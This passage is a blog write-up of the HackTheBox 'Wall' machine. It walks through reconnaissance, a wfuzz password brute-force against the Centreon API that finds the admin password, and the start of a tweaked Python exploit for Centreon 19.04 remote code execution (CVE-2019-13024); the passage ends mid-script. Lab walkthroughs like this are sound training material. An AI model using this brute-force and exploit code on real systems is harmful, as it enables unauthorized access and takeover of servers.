<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Wall - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.
First thing first, let&amp;rsquo;s add the box IP to the hosts file:
$ echo &amp;#34;10.10.10.157 wall.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&amp;rsquo;s start!
User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
$ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET Nmap scan report for wall."/>
<meta name="keywords" content="hackthebox, ctf, wall, gobuster, wfuzz, centreon, cve-2019-13024, waf, filter, screen"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/wall/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/img/favicon.ico">



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Wall - HackTheBox"/>
<meta name="twitter:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out."/>



<meta property="og:title" content="Wall - HackTheBox" />
<meta property="og:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/wall/" />
<meta property="article:published_time" content="2019-12-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-12-07T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.rocks</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="24">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h2 class="post-title"><a href="/posts/wall/">Wall - HackTheBox</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          2019-12-07
        </span>

        
          
        
      

      <span class="post-author">— Written by hg8</span>
      
        <span class="post-read-time">— 9 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/wall/">wall</a>&nbsp;
        
          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
        
          #<a href="/tags/wfuzz/">wfuzz</a>&nbsp;
        
          #<a href="/tags/centreon/">centreon</a>&nbsp;
        
          #<a href="/tags/cve-2019-13024/">cve-2019-13024</a>&nbsp;
        
          #<a href="/tags/waf/">waf</a>&nbsp;
        
          #<a href="/tags/filter/">filter</a>&nbsp;
        
          #<a href="/tags/screen/">screen</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/wall-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <p>Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.</p>
<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.157 wall.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>and let&rsquo;s start!</p>
<h1 id="user-flag">User Flag</h1>
<h2 id="recon">Recon</h2>
<p>Let&rsquo;s start with the classic nmap scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC wall.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-28 16:25 CET
Nmap scan report <span style="color:#66d9ef">for</span> wall.htb <span style="color:#f92672">(</span>10.10.10.157<span style="color:#f92672">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">(</span><span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span><span style="color:#f92672">)</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.37 seconds
</code></pre></div><p>We have a classical web app running on port 80 and the ssh port 22 open.</p>
<p>Opening <a href="http://wall.htb">http://wall.htb</a> display the Apache2 Ubuntu Default Page as <code>nmap</code> told us:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67693154-8bae0800-f9a1-11e9-995d-b2fb18a8a970.png" alt="Wall website"></p>
<p>The source code of the page do not reveal any sneaky hidden code so let&rsquo;s move on.</p>
<p>We launch <code>gobuster</code> to see if we can find interresting files and/or directories :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://wall.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htaccess.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htpasswd.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/aa.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/monitoring <span style="color:#f92672">(</span>Status: 401<span style="color:#f92672">)</span>
/panel.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
2019/10/28 16:39:57 Finished
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
</code></pre></div><p>Two files looks interesting here : <code>aa.php</code> and <code>panel.php</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ http wall.htb/aa.php
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Connection: Keep-Alive
Content-Length: <span style="color:#ae81ff">1</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
Date: Mon, <span style="color:#ae81ff">28</span> Oct <span style="color:#ae81ff">2019</span> 15:48:45 GMT
Keep-Alive: timeout<span style="color:#f92672">=</span>5, max<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>

<span style="color:#ae81ff">1</span>

$ http wall.htb/panel.php
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Connection: Keep-Alive
Content-Length: <span style="color:#ae81ff">26</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
Date: Mon, <span style="color:#ae81ff">28</span> Oct <span style="color:#ae81ff">2019</span> 15:49:13 GMT
Keep-Alive: timeout<span style="color:#f92672">=</span>5, max<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>

Just a test <span style="color:#66d9ef">for</span> php file !
</code></pre></div><p>Hum we do not have too much informations here. <code>/monitoring</code> and <code>/server-status</code> prompt Basic Auth.</p>
<p>From here we didn&rsquo;t make a lot of progress. Trying to brute-force the Basic Auth of <code>/monitoring</code> and <code>/server-status</code> doesn&rsquo;t gives results. We don&rsquo;t even have any particular informations on the two php files.
After getting into rabbit holes for a few times I decided to try different HTTP Method on the php endpoints with a simple command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#66d9ef">for</span> method in GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span style="color:#66d9ef">do</span>
&gt; echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\n</span>$method<span style="color:#e6db74">:</span><span style="color:#e6db74">&#34;</span>
&gt; curl -X $method http://wall.htb/aa.php
&gt; <span style="color:#66d9ef">done</span>
</code></pre></div><p>No interresting results, neither on <code>panel.php</code>. Out of despair I decide to try on the <code>/monitoring</code> endpoint. And finally:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#66d9ef">for</span> method in GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span style="color:#66d9ef">do</span>
   echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\n</span>$method<span style="color:#e6db74">:</span><span style="color:#e6db74">&#34;</span>
   curl -X $method http://wall.htb/monitoring/
  <span style="color:#66d9ef">done</span>
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
POST:
&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;

&lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0; URL=&#39;/centreon&#39;&#34;</span> /&gt;
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>Interresting, the <code>/centreon</code> endpoint slipped from the <code>gobuster</code> enumeration. Maybe a bigger wordlist might have discovered it. For future references I add this endpoint to the wordlist I use the most :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo centreon &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt
</code></pre></div><p>We got our initial foothold. Opening the page show the classical Centreon login page :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67695628-ab472f80-f9a5-11e9-8047-3febc7e9a9a9.png" alt="Wall Centreon login page"></p>
<p>For reference :</p>
<blockquote>
<p>Centreon is a network, system, applicative supervision and monitoring tool
<a href="https://www.centreon.com">https://www.centreon.com</a></p>
</blockquote>
<p>The login page display the version number: <code>v. 19.04.0</code>. Searching for exploits on this version we found a Remote Code Execution vulnerability:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ getsploit centreon
Total found exploits: <span style="color:#ae81ff">10</span>
Web-search URL: https://vulners.com/search?query<span style="color:#f92672">=</span>bulletinFamily%3Aexploit+AND+centreon

Centreon 19.04  - Remote Code | https://vulners.com/exploitdb/EDB-ID:47069
</code></pre></div><p>Unfortunately this is a Authenticated RCE and we have no way to bypass authentication. Since we don&rsquo;t have any clues, let&rsquo;s try to bruteforce with user <code>admin</code>.</p>
<p>To avoid the struggle of <code>centreon</code> token on the login page we will use the Centreon API instead. The documentation is available on the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication">Centreon documentation</a>.</p>
<p>I like to use <a href="https://github.com/berzerk0/Probable-Wordlists">Probable-Wordlists</a> instead of the classic <code>rockyou.txt</code> that countains too much garbages:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top304Thousand-probable-v2.txt
2019-10-28 17:38:52 <span style="color:#f92672">(</span>15.4 MB/s<span style="color:#f92672">)</span> - ‘Top304Thousand-probable-v2.txt’ saved <span style="color:#f92672">[</span>2811012/2811012<span style="color:#f92672">]</span>
$ wfuzz -z file,Top304Thousand-probable-v2.txt -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> --hc <span style="color:#ae81ff">403</span> http://wall.htb/centreon/api/index.php<span style="color:#ae81ff">\?</span>action<span style="color:#ae81ff">\=</span>authenticate
********************************************************
* Wfuzz 2.4.1 - The Web Fuzzer                         *
********************************************************

Target: http://wall.htb/centreon/api/index.php?action<span style="color:#f92672">=</span>authenticate
Total requests: 303872

<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
ID           Response   Lines    Word     Chars       Payload
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>

000000048:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">1</span> W      <span style="color:#ae81ff">61</span> Ch       <span style="color:#e6db74">&#34;password1&#34;</span>                                                                                                                                                                                                                                                                        ^C
</code></pre></div><p>We now have the credentials, let&rsquo;s login and try to execute the exploit. The exploit author wrote a <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">blog post</a> explaining in detail the issue and how the exploit work. It&rsquo;s a very useful ressource to tweak the exploit to make it working on this box.</p>
<p>I had to tweak a few lines to make it work it work properly on that box, my final script was :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cat exploit<span style="color:#f92672">.</span>py
<span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> warnings
<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup

warnings<span style="color:#f92672">.</span>filterwarnings(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ignore</span><span style="color:#e6db74">&#34;</span>, category<span style="color:#f92672">=</span><span style="color:#a6e22e">UserWarning</span>, module<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bs4</span><span style="color:#e6db74">&#39;</span>)

url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">http://wall.htb/centreon</span><span style="color:#e6db74">&#34;</span>
username <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">admin</span><span style="color:#e6db74">&#34;</span>
password <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">password1</span><span style="color:#e6db74">&#34;</span>
ip <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">10.10.10.10</span><span style="color:#e6db74">&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8585</span>

command <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]

request <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Retrieving CSRF token to submit the login form</span><span style="color:#e6db74">&#34;</span>)
page <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/index.php</span><span style="color:#e6db74">&#34;</span>)
html_content <span style="color:#f92672">=</span> page<span style="color:#f92672">.</span>text
soup <span style="color:#f92672">=</span> BeautifulSoup(html_content, features<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">html.parser</span><span style="color:#e6db74">&#34;</span>)
token <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>findAll(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">input</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">value</span><span style="color:#e6db74">&#34;</span>)

login_info <span style="color:#f92672">=</span> {
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">useralias</span><span style="color:#e6db74">&#34;</span>: username,
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">password</span><span style="color:#e6db74">&#34;</span>: password,
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">submitLogin</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Connect</span><span style="color:#e6db74">&#34;</span>,
